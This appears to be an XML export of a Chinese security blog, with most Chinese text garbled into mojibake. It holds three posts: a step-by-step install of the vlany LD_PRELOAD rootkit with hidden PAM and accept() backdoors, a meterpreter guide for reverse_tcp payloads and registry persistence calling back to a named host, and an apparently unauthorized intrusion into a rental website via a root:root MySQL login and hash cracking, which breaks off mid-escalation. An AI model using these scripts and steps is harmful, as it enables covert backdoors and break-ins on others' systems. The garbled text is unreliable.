    <content type="text"><![CDATA[Ê≠§Â∑•ÂÖ∑vlanyÈÄöËøáLD_PRELOADÁéØÂ¢ÉÂèòÈáèÂíå/etc/ld.so.preloadÁöÑÈÖçÁΩÆÊñá‰ª∂Êù•ÈáçÂÜôÁ≥ªÁªüË∞ÉÁî®ÂáΩÊï∞ÔºåÂä†ËΩΩÊîªÂáªËÄÖËá™ÂÆö‰πâÁöÑÊÅ∂ÊÑèÂáΩÊï∞„ÄÇ 0x00 Â∑•ÂÖ∑ÂéüÁêÜÂàÜÊûê È¢ÑÂä†ËΩΩÂä®ÊÄÅËøûÊé•Â∫ìËøôÁßçÂà©Áî®ÊäÄÊúØÔºåÂú®Êó©‰∫õÂπ¥ÂõΩÂ§ñÂ∞±Â∑≤ÁªèÊúâËøáÂà©Áî®Áõ∏ÂÖ≥ÁöÑÊñáÁ´†„ÄÇÂè™ÊòØËøëÂπ¥ÂõΩÂÜÖÊÅ∂ÊÑèËΩØ‰ª∂Âà©Áî®È¢ëÁπÅË¢´ÂêÑÂ§ßÂÆâÂÖ®ÂéÇÂïÜÊçïËé∑ÂàÜÊûêÔºå‰πüÂ∞±Ê∏êÊ∏êÂÖ¨Â∏ÉÂú®Â§ß‰ºóÁúºÂâç„ÄÇÂØπ‰∫éËøôÁßçÂà©Áî®ÁöÑÂ§ßÊ¶ÇÂéüÁêÜÔºåÂ∑≤ÊúâÊñáÁ´†ÂÅö‰∫ÜÊ∑±ÂÖ•ÂàÜÊûêÔºåËøôÈáåÂ∞±‰∏çÈáçÂ§çÈÄ†ËΩÆ„ÄÇÊñáÁ´†Âú∞ÂùÄÔºöË≠¶ÊÉïÂà©Áî®LinuxÈ¢ÑÂä†ËΩΩÂûãÊÅ∂ÊÑèÂä®ÊÄÅÈìæÊé•Â∫ìÁöÑÂêéÈó® 0x01 ‰∏ãËΩΩÈ°πÁõÆÂÆûÈ™åÁéØÂ¢ÉCentOS-6.9 ÂÜÖÊ†∏Ôºö2.6.32-696.el6.x86_64 Êû∂ÊûÑÔºöx86_64Kali-2018 ÂÜÖÊ†∏Ôºö4.17.0-kali1-amd64 Êû∂ÊûÑÔºöx86_64 #‰∏çÊîØÊåÅ ÁºñËæëÊñá‰ª∂quick_install.shÔºö ÂêéÈó®ÂÆâË£ÖËÑöÊú¨È°πÁõÆÂú∞ÂùÄ123456789101112131415161718#!/bin/sh[ $(id -u) != 0 ] &amp;&amp; &#123; echo "Not root. Exiting."; exit; &#125;WORKING_DIR="/tmp/.$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"ARCHIVE_NAME="$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1).tar.gz"mkdir $WORKING_DIR &amp;&amp; cd $WORKING_DIRwget https://github.com/mempodippy/vlany/archive/master.tar.gz -O $ARCHIVE_NAMEtar xvpfz $ARCHIVE_NAME &amp;&amp; rm $ARCHIVE_NAMEcd vlany-masterchmod +x install.sh./install.shrm -rf $WORKING_DIR#‰∏ãËΩΩÂÆåÂêéÂà†Èô§È°πÁõÆrm -f $0#ÊâßË°åÂêéÂà†Èô§Ëá™Ë∫´ËÑöÊú¨ 0x02 ÁºñËØëÂÆâË£Öquick_install.sh‰∏ãËΩΩÈ°πÁõÆÂêéËß£ÂéãË∞ÉÁî®install.shËÑöÊú¨ÔºåÈ¶ñÂÖà‰ºöÊ£ÄÊµãSElinuxÊòØÂê¶ÂÖ≥Èó≠Â¶ÇÊûúÊ≤°ÂÖ≥Èó≠ÔºåËÑöÊú¨‰ºöÂÖ≥Èó≠SElinux„ÄÇÊ≠§Êó∂ÈúÄË¶ÅÈáçÂêØÊú∫Âô®„ÄÇ ÂÆûÈôÖÂ∫îÁî®‰∏≠ÔºåÂ¶ÇÊûú‰∏çÊÉ≥ÈáçÂêØÊú∫Âô®ÔºåÂèØ‰ª•ÂçïÁã¨‰∏ãËΩΩÈ°πÁõÆÊâßË°åÂëΩ‰ª§wget https://github.com/mempodippy/vlany/archive/master.tar.gz &amp;&amp; tar xvpfz master.tar.gz &amp;&amp; cd vlany-masterÈáçÊñ∞Âª∫Á´ãÁªàÁ´ØÔºåÁÑ∂ÂêéËæìÂÖ•setenforce 0ÔºåÂÜçÊõ¥Êîπinstall.shËÑöÊú¨ install.sh202122232425 if [[ $(sestatus -v | head -n 1) == *"enabled"* ]]; then echo "SELinux is still enabled. Reboot." exit # Ê≥®ÈáäÊ≠§Ë°å else echo "SELinux is disabled." fi Ê£ÄÈ™åÂÆåSElinuxÔºåÁ®ãÂ∫èÂá∫Áé∞ÊèêÁ§∫Ê°ÜÈÄâÂú®grubÈÖçÁΩÆ‰ΩçÁΩÆÔºåÊù•Á°ÆËÆ§ÂΩìÊú∫Âô®ÈáçÂêØÂêé ÂêéÈó®‰æùÁÑ∂ÁîüÊïà„ÄÇÊ†πÊçÆÊú∫Âô®ÂÆûÈôÖÊÉÖÂÜµÂ°´ÂÜôÔºåÈªòËÆ§/etc/grub.conf Enter location of bootloader config file (if grub2, config file is /boot/grub/grub.cfg) [/etc/grub.conf]: ÁÑ∂Âêé‰∏ÄË∑ØÂõûËΩ¶ÔºåÁ≠âÂæÖgccÁ≠â‰æùËµñÂÆâË£ÖÂÆåÊàêÔºåÂá∫Áé∞Â¶Ç‰∏ãÁïåÈù¢„ÄÇÈÄâÊã©ÊòØÁºñËØëÂπ∂ÂÆâË£ÖÔºåËøòÊòØÂè™ÁºñËØëÔºåÊàë‰ª¨ËøôÈáåÈÄâÂú®YES 1. ÈÖçÁΩÆPAMÂêéÈó®ÂÜç‰∏ÄË∑ØÂõûËΩ¶ÔºåÂà∞Â¶Ç‰∏ãÁïåÈù¢„ÄÇËÆæÁΩÆÈÄöËøásshËøûÊé•ÁöÑPAMÁî®Êà∑ÂêçÔºåËÆ∞‰ΩèÊ≠§ÂêéÈó®Áî®Êà∑Âêç ÁÑ∂ÂêéËÆæÁΩÆPAMÂØÜÁ†ÅÔºåËøôÈáåËæìÂÖ•ÂØÜÁ†Å‰∏ç‰ºöÂõûÊòæ‰ªª‰Ωï‰∏úË•øÔºåÁªßÁª≠ËæìÂÖ•Â∞±ok ËÆæÁΩÆPAMÁ´ØÂè£Ôºå‰πüÊòØÈúÄË¶ÅÈöêËóèÁöÑÁ´ØÂè£ 2. ÈÖçÁΩÆaccept()ÂêéÈó®ËÆæÁΩÆËøûÊé•ÊòØÂê¶‰ΩøÁî®SSLÂä†ÂØÜÔºåËøôÊµãËØïÈÄâÊã©NO ËÆæÁΩÆaccept()ÂêéÈó®ÂØÜÁ†ÅÔºå‰∏ÄÊ†∑Ê≤°ÊúâÂõûÊòæ„ÄÇ ËÆæÁΩÆaccept()ÂêéÈó®ÈöêËóèÁ´ØÂè£ ËÆæÁΩÆexecve()ÂØÜÁ†ÅÔºåÁÑ∂ÂêéÂÜçÂÜçÂÜç‰∏ÄË∑ØÂõûËΩ¶ÔºåÂá∫Áé∞Â¶Ç‰∏ãÁïåÈù¢ÔºåÊòØÂê¶Âà†Èô§ÁºñËØëÈ°πÁõÆÁöÑË∑ØÂæÑ„ÄÇ ÂÆåÊàêÂêéÔºåËÑöÊú¨‰ºöÊèêÁ§∫ÊòØÂê¶ÂÆâË£Ö‰ΩúËÄÖÊñ∞Á†îÁ©∂ÁöÑsnodewÂêéÈó®ËøôÈáåÈÄâÊã©NO 1Installation has finished. Would you like to setup the experimental snodew root reverse shell backdoor? (YES/NO) (case-sensitive) [YES]: 3. ËøûÊé•‰ø°ÊÅØ123456789101112131415#sshËøûÊé•PAMÁî®Êà∑ÂêçPAM backdoor username: kionf#PAMÁ´ØÂè£Hidden PAM port: 4397#acceptÂêéÈó®ÈöèÊú∫Á´ØÂè£Âè∑accept backdoor low port: 271accept backdoor high port: 274#ÂêéÈó®‰ΩçÁΩÆHidden directory: /lib/libc.so.kionf.14#ÂèòÈáèEnvironment variable: UVRTBKAYCLWI ÂÖ®ÈÉ®ÈÖçÁΩÆÂÆåÊàêÂêéÔºå‰ºöÂëàÁé∞Âá∫Â¶Ç‰∏äËøûÊé•‰ø°ÊÅØ 0x03 ËøûÊé•ÂêéÈó®1. PAMÂêéÈó®ËøûÊé•ssh.sh12345678910111213141516#!/bin/bash# Small bash script designed to allow easy connection to hidden PAM backdoors.# Gets copied to your hidden directory in case you want to route through more# than one rooted box. :)usage () &#123; echo "$0 &lt;PAM backdoor username&gt; &lt;host&gt; &lt;hidden PAM port&gt;"; exit; &#125;[ -z $1 ] &amp;&amp; &#123; usage; &#125;[ -z $2 ] &amp;&amp; &#123; usage; &#125;[ -z $3 ] &amp;&amp; &#123; usage; &#125;[ ! -f /usr/bin/socat ] &amp;&amp; &#123; echo "socat isn't installed. exiting."; exit; &#125;echo "Connecting to PAM backdoor @ host $2 on hidden PAM port $3 as $1"read -p "Press enter to continue"ssh -o ProxyCommand="socat - tcp4-connect:$2:22,bind=:$3" $2 -l "$1" ‰ΩøÁî®ÂÖ∂‰ªñÊú∫Âô®ËøûÊé•ÂêéÈó®ÔºåÁºñËæëÊñá‰ª∂ssh.sh„ÄÇ 1sh ssh.sh kionf 192.168.10.35 4397 ËøûÊé•ÊàêÂäü Âú®Ë¢´ÊîªÂáªÁ´ØÊü•ÁúãÊòØÂê¶ÊúâÂºÇÂ∏∏ËøûÊé•ÔºåÂÆåÂÖ®ÈöêËóèÊ≤°ÊúâÊòæÁ§∫Âá∫‰ªª‰ΩïËøûÊé•‰ø°ÊÅØÔºåÂπ∂‰∏îÊü•Áúã/etc/passwdÊñá‰ª∂ÔºåÊ≤°ÊúâÊàë‰ª¨ÊâÄ‰ΩøÁî®ÁöÑkionfÁî®Êà∑ Ê≥®ÊÑèÔºöÂ¶ÇÊûú‰∏ç‰ΩøÁî®ssh.shËÑöÊú¨ËøûÊé•pamÂêéÈó®ÔºåÁõ¥Êé•‰ΩøÁî®sshËøûÊé•„ÄÇË¢´ÊîªÂáªÁ´Ø‰ºöÊü•ÁúãÂà∞sshËøûÊé•‰ø°ÊÅØ 2. accept()ÂêéÈó®ËøûÊé•1234567#accept backdoor low port: 271#accept backdoor high port: 274# -p ÊåáÂÆö 271-274 ËåÉÂõ¥ÂÜÖÁ´ØÂè£nc 192.168.10.35 22 -p 271#ËæìÂÖ•ËÆæÂÆöÁöÑacceptÂØÜÁ†ÅÂêéÂõûËΩ¶kionf [+] shell dropped accept()ÂêéÈó®Âú®ÂÆûÈôÖÊµãËØï‰∏≠Ê≤°ÊúâÊàêÂäüÔºåÁî±‰∫éÂÜÖÊ†∏ÁâàÊú¨Á≠âÈóÆÈ¢ò„ÄÇ 0x04 Ê£ÄÊµã1git clone https://github.com/mempodippy/detect_preload.git &amp;&amp; cd detect_preload &amp;&amp; ./detect_preload ÊâßË°å‰ª•‰∏äÂ∞èÁ®ãÂ∫èÊü•ÁúãËæìÂá∫ 1234567[+] finished basic checks0x7f0144ca2000 /lib64/libdl.so.20x7f014490a000 /lib64/libc.so.60x7f01446ca000 /lib64/libcrypt.so.1(nil) /lib64/ld-linux-x86-64.so.20x7f01444c2000 /lib64/libfreebl3.so Ê≠§Á®ãÂ∫èËé∑ÂèñÂä®ÊÄÅËøûÊé•Â∫ì‰ø°ÊÅØÔºåld-linux-x86-64.so.2 Êó†Ê≥ïËé∑ÂèñÔºåÂ≠òÂú®ÂêéÈó®„ÄÇÊ≠§rookitÊ∏ÖÁêÜÂè™ËÉΩÊõøÊç¢Ë¢´‰øÆÊîπÁöÑÊÅ∂ÊÑèÂä®ÊÄÅÈìæÊé•Â∫ì ÂèÇËÄÉÔºö vlany_readme_file Á≥ªÁªüÂáΩÊï∞ vlany_wiki üëø]]></content>
      <categories>
        <category>Sec</category>
        <category>Rookit</category>
      </categories>
      <tags>
        <tag>Rookit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂÖ≥‰∫é meterpreter ÊåÅ‰πÖÂåñÈóÆÈ¢òÁ†îÁ©∂]]></title>
    <url>%2F2018%2F09%2F13%2Fmetasploit-presistence%2F</url>
    <content type="text"><![CDATA[meterperter Ëé∑ÂèñÂà∞SessionÊó∂Â¶ÇÊûúÂΩìÂâçsessionÈÄÄÂá∫ÔºåÂ∞±‰∏ç‰ºöÂú®Ëá™Âä®ËøûÊé•Ôºå‰ΩøÁî®Â∏∏ËßÅÊåÅ‰πÖÂåñ‰πüÂè™ÊòØÂú®ËøúÁ®ãÁî®Êà∑ÁôªÂΩïÔºåÊàñËÄÖËøúÁ®ãÊú∫Âô®ÈáçÂêØÊó∂Êâç‰ºöËøîÂõûsession„ÄÇ‰ªäÂ§©‰∏ªË¶Å‰ªãÁªçpersistenceËÑöÊú¨ÁöÑËá™ÂÆö‰πâÈÖçÁΩÆÔºåÊù•ÂÆûÁé∞Â¶ÇÊûúsessionÊñ≠ÂºÄÔºåÂÆ¢Êà∑Á´ØÂÆöÊó∂ÈáçÊñ∞Â∞ùËØïËøûÊé•ÊúçÂä°Á´Ø(msfÁ´Ø) 0x00 Âª∫Á´ãËøûÊé•ÊúçÂä°Á´ØÂêØÂä®msfÂπ∂ÁõëÂê¨Á´ØÂè£Á≠âÂæÖsession ÂêéÂè∞ÁõëÂê¨Á´ØÂè£12345678910msf&gt; handler -p windows/meterpreter/reverse_tcp -H 0.0.0.0 -P 33333msf&gt; jobsJobs==== Id Name Payload Payload opts -- ---- ------- ------------ 5 Exploit: multi/handler windows/meterpreter/reverse_tcp tcp://0.0.0.0:33333 ÁîüÊàêÂêéÈó®Êñá‰ª∂ÂÆ¢Êà∑Á´ØÊâßË°åÂª∫Á´ãËøûÊé•: ‰∏çÂÖçÊùÄÔºåÊú¨Êñá‰∏çÂÅö‰ªãÁªç123msf&gt; msfvenom -p windows/meterpreter/reverse_tcp lhost=b1g-d1ck.kionf.com lport=33333 -f exe &gt; scvhost.exe# lhost‰∏∫ËøúÁ®ã‰∏ªÊú∫# lport‰∏∫ËøúÁ®ã‰∏ªÊú∫Á´ØÂè£ Ëé∑ÂèñÂà∞ÂÆ¢Êà∑Á´Øsession,ÊåáÂÆösession id ËøõÂÖ•meterpreter‰ºöËØù 12345msf&gt; session -i 6[*] Starting interaction with 6...meterpreter &gt; 0x01 persistenceËÑöÊú¨ÊåÅ‰πÖÂåñ ÂΩì‰ΩøÁî®run persistenceËøõË°åÊåÅ‰πÖÂåñÊó∂ÈªòËÆ§ËøúÁ®ãË∑ØÂæÑ‰ºöÊé®ÈÄÅÂà∞%TEMP%(‚Äúc:\users\appdata\local\temp\‚Äú)„ÄÇÂΩìÁî®Êà∑ÈáçÂêØÊàñËÄÖtempÁõÆÂΩï‰∏ãÂ≠òÂú®Êï∞Â≠óidÔºåpersistenceÊåÅ‰πÖÂåñÂ∞±‰ºöÂá∫Èîô„ÄÇ metasploit Êñ∞ÁâàÊú¨Â∑≤‰∏çÊé®Ëçê‰ΩøÁî®Ê≠§ËÑöÊú¨ÔºåÂπ∂‰∏î‰ΩøÁî®run persistence -h Êü•ÁúãÈÄâÈ°π‰ø°ÊÅØÊó∂‰ºöÊä•ÈîôÔºåÊâÄ‰ª•ÂàÜÊûêÁõ¥Êé•ËÑöÊú¨Êñá‰ª∂ ÂàÜÊûêpersistencerubyËÑöÊú¨Êñá‰ª∂/usr/share/metasploit-framework/scripts/meterpreter/persistence.rb vimÊâìÂºÄ:set nuÊòæÁ§∫Ë°åÂè∑ÔºåÊ†πÊçÆÂêçÁß∞ÂèØËá™Ë°åÂàÜÊûêÊõ¥ÊîπÈÖçÁΩÆ ‰ª£Á†ÅÁâáÊÆµÔºåÊ≠§‰ª£Á†ÅÊÆµ‰∏∫ÈªòËÆ§ÈÖçÁΩÆ14 key = "HKLM"1516 # Default parameters for payload17 rhost = Rex::Socket.source_address("b1g-d1ck.kionf.com")18 rport = 3333319 delay = 1020 install = false21 autoconn = false22 serv = false23 altexe = nil24 target_dir = nil25 payload_type = "windows/meterpreter/reverse_tcp"26 script = nil27 script_on_target = nil Ê≠§‰ª£Á†ÅÊÆµ‰∏∫Â∏ÆÂä©‰ø°ÊÅØ31 "-h" =&gt; [ false, "This help menu"],32 "-r" =&gt; [ true, "The IP of the system running Metasploit listening for the connect back"],33 "-p" =&gt; [ true, "The port on which the system running Metasploit is listening"],34 "-i" =&gt; [ true, "The interval in seconds between each connection attempt"],35 "-X" =&gt; [ false, "Automatically start the agent when the system boots"],36 "-U" =&gt; [ false, "Automatically start the agent when the User logs on"],37 "-S" =&gt; [ false, "Automatically start the agent on boot as a service (with SYSTEM privileges)"],38 "-A" =&gt; [ false, "Automatically start a matching exploit/multi/handler to connect to the agent"],39 "-L" =&gt; [ true, "Location in target host to write payload to, if none \%TEMP\% will be used."],40 "-T" =&gt; [ true, "Alternate executable template to use"],41 "-P" =&gt; [ true, "Payload to use, default is windows/meterpreter/reverse_tcp."] È´ò‰∫ÆÈÉ®ÂàÜ‰∏∫Â∏∏Áî®ÈÖçÁΩÆÈ°π Ê±âÂåñÁâà-h Â∏ÆÂä©‰ø°ÊÅØ-r ËøúÁ®ãÊúçÂä°Á´ØÁõëÂê¨Á´ØÂè£-p ËøúÁ®ãÊúçÂä°Á´ØÁõëÂê¨Á´ØÂè£-i ÊØèÈöîÂá†ÁßíÈáçËØïËøûÊé•-X Êõ¥ÈöèÁ≥ªÁªüËá™ÂêØÂä®-U ÂΩìÁî®Êà∑ÁôªÂΩïÊó∂Ëá™ÂêØÂä®-S ‰Ωú‰∏∫ÊúçÂä°ÂêØÂä®-A ÊúçÂä°Á´ØËá™Âä®Âª∫Á´ãhandlerÁõëÂê¨ÊúçÂä°-L ÂêéÈó®‰º†Âà∞ËøúÁ®ã‰∏ªÊú∫ÁöÑ‰ΩçÁΩÆÈªòËÆ§‰∏∫%TEMP%-T ÈÖçÁΩÆÊ®°Áâà-P ‰ΩøÁî®ÁöÑPayloadÔºåÈªòËÆ§windows/meterpreter/reverse_tcp Ê†πÊçÆÈÄâÈ°πÂ∏ÆÂä©ÊèêÁ§∫ÊâßË°åÊåÅ‰πÖÂåñÂëΩ‰ª§Ôºö 123meterpreter &gt; run persistence -S -i 5 -p 33333 -r b1g-d1ck.kionf.com -L c:\\Windows\\System32# ËÑöÊú¨Ê≥®ÂÜåËá™ÂêØÂä®Ê≥®ÂÜåË°®‰ΩçÁΩÆÔºöHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 0x02 ÊµãËØïÊµãËØïÈÄÄÂá∫ÂΩìÂâçsession„ÄÇok 5ÁßíÂêésessionÂèàËá™Âä®ËøûÊé•ÂõûÊù•‰∫Ü Ê≥®Ôºö Â¢ûÂà†ÊîπÊü•Ê≥®ÂÖ•Ëá™ÂêØÂä®Ê≥®ÂÜåË°®# Êü•ËØ¢Keymeterpreter &gt; reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunEnumerating: HKLM\Software\Microsoft\Windows\CurrentVersion\Run Values (3): SysTeM32 MDxTmrUjRGnvIaT UxMvAJkbedJu# Êü•ËØ¢Valuesmeterpreter &gt; reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v UxMvAJkbedJuKey: HKLM\Software\Microsoft\Windows\CurrentVersion\RunName: UxMvAJkbedJuType: REG_SZData: c:\Windows\System32\ANoZYsNFQVe.vbs# Âà†Èô§Valuesmeterpreter &gt; reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v MDxTmrUjRGnvIaTSuccessfully deleted MDxTmrUjRGnvIaT. /usr/share/metasploit-framework/scripts/ Ê≠§ÁõÆÂΩïÂ≠òÊîærunËÑöÊú¨/usr/share/metasploit-framework/modules/ Ê≠§ÁõÆÂΩïÂ≠òÊîæÂêÑÁßçËÑöÊú¨ÊáµÈÄºÁöÑÊó∂ÂÄôÁõ¥Êé•Ëá™Â∑±ËøõÂéªÁúãËÑöÊú¨„ÄÇ]]></content>
      <categories>
        <category>kali</category>
        <category>metasploit</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ê∏óÈÄèÊµãËØïÂ∞èËÆ∞-Áî±ÁßüÊàøÂºïÂèëÁöÑÊÉ®Ê°à]]></title>
    <url>%2F2018%2F09%2F11%2Fhack-note-00100%2F</url>
    <content type="text"><![CDATA[‰Ωú‰∏∫‰∏ÄÂêçÔºåÊÄÄÊè£Ëøú(che)Â§ß(du)ÁêÜ(zi)ÊÉ≥(ne)ÁöÑÂåóÊºÇÔºåÊ∞∏ËøúÁ¶ª‰∏çÂºÄÁßüÊàøÂ≠êÁöÑËØùÈ¢òÔºå58.ÈìæÂÆ∂.ÊàëÁà±ÊàëÂÆ∂‚Ä¶ÂêÑÁßç‰∏≠‰ªãÂùëÁöÑÂøÉÊÖåÔºåÊÉ≥Áõ¥Êé•Êâæ‰∏™Êàø‰∏úÊï¥Áßü‰∏Ä‰∏™ÔºåÂÅ∂ÁÑ∂Èó¥‰∫ÜËß£Âà∞xxÁΩëÁ´ôÊòØ‰∏ì‰∏∫‰∏≠‰ªãÁªüËÆ°ÁöÑÊàø‰∏úÊàøÊ∫êÔºåÂΩìÁÑ∂ÊòØËä±Èí±ÁöÑÔºàMM„ÄÇÔºâÔºåÈÅÇÂºïÂèë‰∫Ü‰ª•‰∏ãÊÉ®Ê°à„ÄÇ‰∫∫Áã†ËØù‰∏çÂ§öÔºåÊï¥ÔºÅ 0x00 ‰ø°ÊÅØÊî∂ÈõÜ1. okÈ¶ñÂÖàÊãøÂà∞ÁΩëÁ´ôÂêéÔºåÂÖàÊâìÂºÄÂÆòÁΩëÁûÖ‰∫ÜÁûÖ: ÁÆÄÂçïÂàÜÊûê‰∏∫PHPÂÜôÁöÑÔºåÊ≤°ÊúâÁôªÈôÜÊàø‰∏úÁöÑÊâãÊú∫Âè∑‰∏∫ÊâìÁ†ÅÁä∂ÊÄÅÔºåÂáåÊô®1ÁÇπÂçäÁöÑÊàëÔºåËÑ∏‰∏äÈÄêÊ∏êÊºèÂá∫Á¨ëÂÆπ ÔºöÔºâ 2. Èöè‰æøËæìÂÖ•‰∏Ä‰∏™Âú∞ÂùÄÔºö ÁúãÂà∞Ëøô‰∏™‰∏ßÈÄºËÑ∏ÔºåÁªèÈ™åÂëäËØâÊàëTMËøôÂ∞±ÊòØ ThinkPhpÊ°ÜÊû∂ 3. Âú®Êêû‰∏™Èöè‰æøËæìÂÖ•‰∏™404Âú∞ÂùÄ ÁªºÂêà‰ª•‰∏äÊâãÊí∏ÔºåÂàÜÊûêÂ§ßÊ¶ÇÁéØÂ¢É‰∏∫Ôºö ÁéØÂ¢ÉIIS + ThinkPHP + php + Windows Ê≠§ÁªìÊûú‰∏∫ÊâãÊµãÔºåÁªèÈ™å‰∏çË∂≥ÂèØ‰ª•‰ΩøÁî®whatwebÊ£ÄÊµãwebÁéØÂ¢É whatweb xxx.com1http://xxx.com/index.php/Manage/Login/index [200 OK] Cookies[BJYADMIN], Country[CHINA][CN], HTML5, HTTPServer[Microsoft-IIS/7.0], IP[115.28.xxx.xxx], JQuery[1.11.1], Microsoft-IIS[7.0], PasswordField[password], Script[JavaScript,javascript,text/javascript], Title[ÁÆ°ÁêÜÁ≥ªÁªü], X-Powered-By[thinkphp-bjyadmin, ASP.NET], X-UA-Compatible[IE=edge] 4. ÂüüÂêçÂàÜÊûêdig xxx.com; &lt;&lt;&gt;&gt; DiG 9.11.3-1-Debian &lt;&lt;&gt;&gt; xxx.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 364;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;lx808.com. IN A;; ANSWER SECTION:xxx.com. 3599 IN CNAME www.xxx.com.xxx.com.www.xxx.com.xxx.com. 3600 IN A 115.28.xxx.xxx;; Query time: 1370 msec;; SERVER: 108.61.10.10#53(108.61.10.10);; WHEN: Tue Sep 11 18:51:58 CST 2018;; MSG SIZE rcvd: 82 Ëé∑ÂèñÂà∞ipÔºö115.28.xxx.xxxÔºåÊü•ÁúãÊòØIPÁõ∏ÂÖ≥‰ø°ÊÅØÔºö curl cip.cc/115.28.xxx.xxxIP : 115.28.xxx.xxxÂú∞ÂùÄ : ‰∏≠ÂõΩ Â±±‰∏ú ÈùíÂ≤õËøêËê•ÂïÜ : ÈòøÈáå‰∫ëÊï∞ÊçÆ‰∫å : Â±±‰∏úÁúÅÈùíÂ≤õÂ∏Ç | ÈòøÈáåÂ∑¥Â∑¥ÁΩëÁªúÊúâÈôêÂÖ¨Âè∏BGPÊï∞ÊçÆ‰∏≠ÂøÉURL : http://www.cip.cc/115.28.xxx.xxx 5. ‰∏ªÊú∫‰ø°ÊÅØËÑöÊú¨Â∞èÂ≠êÔºå‰∏äÔºÅnmap Êâ´Êèè nmap -sV -T4 -O -F --version-light 115.28.xxx.xxxNmap scan report for 115.28.xxx.xxxHost is up (0.19s latency).Not shown: 83 closed portsPORT STATE SERVICE VERSION25/tcp filtered smtp80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)135/tcp filtered msrpc139/tcp filtered netbios-ssn445/tcp filtered microsoft-ds1027/tcp filtered IIS1028/tcp filtered unknown3128/tcp filtered squid-http3306/tcp open mysql MySQL 5.5.403389/tcp open ms-wbt-server Microsoft Terminal Service5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)8009/tcp open ajp13 Apache Jserv (Protocol v1.3)8080/tcp open http Apache Tomcat/Coyote JSP engine 1.149152/tcp open unknown49153/tcp open unknown49154/tcp open unknown49155/tcp open unknown ÂÖ∂‰∏≠Êúâ‰∏§‰∏™‰∏™ËÆ©‰∫∫ÈùûÂ∏∏ÊÑüÂÖ¥Ë∂£ÁöÑÊúçÂä°ÂèäÁ´ØÂè£Ôºö 3306 Mysql3389 RDP 0x01 Ê∏óÈÄè1. ÈöèÊâã‰∏ÄËæìÂÖ•Â∏¶Êù•ÁöÑÊÉäÂñúÔºÅÁúãÂà∞Â∏∏Áî®Á´ØÂè£ÈÉΩÊ≤°ÊúâÊõ¥ÊîπÔºåÂØπÂ§ñÊö¥Èú≤„ÄÇÁåúÊµãÂÆâÂÖ®ÊÑèËØÜ‰º∞ËÆ°‰πüÊòØÂæàËñÑÂº±ÔºåÈöè‰æøÁî®rootÔºörootËøûÊé•mysql„ÄÇ Duang, Duang, Duang ÊúâÊó∂ÂÄôÂ∞±ÊòØËøôÊ†∑ÁôæÂØÜ‰∏ÄÁñèÔºåÂÆâÂÖ®ÈóÆÈ¢òÁöÑÈáç‰∏≠‰πãÈáçÂ∞±ÊòØÁªÜËäÇÂèØËÉΩ‰Ω†Âú®ÊÉ≥Ëøô‰πàLowÈÄº‰πüÂ•ΩÊÑèÊÄùÂÜôÔºüÈÇ£‰πà‰Ω†Èîô‰∫ÜÔºåÈáçÂ§¥ÊàèÂú®ÂêéÂ§¥ÔºÅ ËøûÊé•ÂêéÔºåÊü•Áúã‰∫Ü‰∏Ä‰∏ãÊï∞ÊçÆÂ∫ìÔºåÊ†πÊçÆÂêçÁß∞ÊâæÂà∞ÂΩìÂâçÁΩëÁ´ôÊâÄ‰ΩøÁî®Êï∞ÊçÆÂ∫ì„ÄÇÊ†πÊçÆË°®ÂêçÊâæÂà∞Â§ßÊ¶Ç‰∏∫Áî®Êà∑Ë¥¶Âè∑ÂØÜÁ†Å‰ø°ÊÅØË°® Â∑≤Âà∞Â§úÊ∑±Ôºå‰∏çÊÉ≥ÂÜçÂä≥‰Ωì‰º§Ë∫´ÔºåÈöè‰æøÊâæ‰∏™Áî®Êà∑ÂêçÔºåmd5ÂØÜÁ†ÅÊâîÂà∞dmd5Ëß£ÂØÜÂá∫ÊòéÊñáÔºåÊú¨‰ª•‰∏∫ËÉΩÁôªÈôÜËøô‰∫ãÂÑøÂ∞±ÁÆó‰∫ÜÔºåÊîæ‰ªñ‰∏ÄÈ©¨„ÄÇ But ! ÊèêÁ§∫Ë¥¶Âè∑ÂØÜÁ†ÅÈîôËØØÔºåÂèàÂ∞ùËØï‰∫ÜÂá†‰∏™Ë¥¶Âè∑ÂèëÁé∞ÔºåË¢´Á¶ÅÁî® ÔºÅÔºÅÈÄöËøáÊü•ÁúãÊï∞ÊçÆÂ∫ìËÆ∞ÂΩïÁöÑÁôªÈôÜ‰ø°ÊÅØandÁåúÊµãÔºåÂæóÂá∫Â∫îËØ•Áé∞Âú®ÁöÑÁΩëÁ´ôÂπ∂Ê≤°ÊúâËøûÊé•Ê≠§Êï∞ÊçÆÂ∫ì„ÄÇÊ∑±Â§úÁöÑÊàëÊâ£‰∫ÜÊâ£ËÑö‰∏´Â≠êÔºåÂèëÁé∞‰∫ãÊÉÖÂπ∂Ê≤°ÊúâÈÇ£‰πàÁÆÄÂçï„ÄÇ ËôΩÁÑ∂Ê≤°Êúâ‰ΩøÁî®Áé∞Âú®ÁöÑÊï∞ÊçÆÂ∫ìÔºå‰ΩÜÊàë‰ª¨ÊòØÊúârootÁôªÈôÜÂà∞Êï∞ÊçÆÂ∫ìÁöÑÂïäÔºåÊùÉÈôêÈ´òÂïäÔºåÊèêÊùÉÂïäÔºÅ Let‚Äôs Go 2. Â∏∏Áî®LowÈÄºMysqlÊèêÊùÉÂá†ÁßçÊñπÂºèÔºö UDFÊèêÊùÉ MOFÊèêÊùÉ into outfileÂÜôÂÖ•shell Á•≠Âá∫ÊàëÁöÑÂÆùË¥ù metasploit 1) MOFÊèêÊùÉËÑöÊú¨Â∞èÂ≠ê‰∏âÈÉ®Êõ≤# 1. 